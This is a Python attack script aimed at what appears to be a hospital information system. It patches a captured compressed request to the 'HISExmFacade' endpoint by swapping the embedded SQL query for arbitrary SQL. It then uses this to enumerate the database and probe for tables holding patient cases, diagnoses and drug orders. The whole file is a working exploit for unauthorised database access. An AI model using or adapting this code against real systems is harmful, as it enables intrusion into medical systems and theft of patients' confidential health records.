from his_client_final import HISClient
import sys, re

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()

def execute_sql(sql_query):
    import zlib, os, requests
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=zlib.compress(patched_payload), headers=c.headers)
    if resp.status_code == 200:
        return zlib.decompress(resp.content).decode('utf-8', errors='ignore')
    return None

def parse_rows(text, tag="DRMODIFY"):
    if not text: return []
    rows = re.findall(f'<{tag}[^>]*>(.*?)</{tag}>', text, re.DOTALL)
    out = []
    for r in rows:
        fields = re.findall(r'<(\w+)>(.*?)</\1>', r)
        out.append({k: v for k, v in fields})
    return out

# List tables with common names
keywords = ['OPD_CASE', 'PAT_CASE', 'OPD_PAT', 'EMG_CASE', 'DIAGNOSIS', 'PAT_DRUG', 'DRUG_ORDER', 'OPDORDM', 'PAT_ADM_CASE', 'CONSULTATION']

for kw in keywords:
    print(f"[*] Checking table: {kw}")
    q = f"SELECT * FROM {kw} WHERE ROWNUM <= 1" # Just to check existence
    # Try with schema if needed
    schemas = ['', 'SYSTEM.', 'OPDUSR.', 'CPOE.']
    found = False
    for schema in schemas:
        try:
            res = execute_sql(f"SELECT * FROM {schema}{kw} WHERE ROWNUM <= 1")
            if res and '<NewDataSet>' in res:
                print(f"  [+] Found: {schema}{kw}")
                found = True
                break
        except: pass
    if not found:
        print(f"  [-] Not found: {kw}")

# Search ALL_TABLES if possible
print("\n[*] Searching ALL_TABLES for '%OPD%'...")
q_all = "SELECT OWNER, TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE '%OPD%' AND ROWNUM <= 20"
res_all = execute_sql(q_all)
rows_all = parse_rows(res_all)
for r in rows_all:
    print(f"  Table: {r.get('OWNER')}.{r.get('TABLE_NAME')}")

print("\n[*] Searching ALL_TABLES for '%CASE%'...")
q_case = "SELECT OWNER, TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE '%CASE%' AND ROWNUM <= 20"
res_case = execute_sql(q_case)
rows_case = parse_rows(res_case)
for r in rows_case:
    print(f"  Table: {r.get('OWNER')}.{r.get('TABLE_NAME')}")
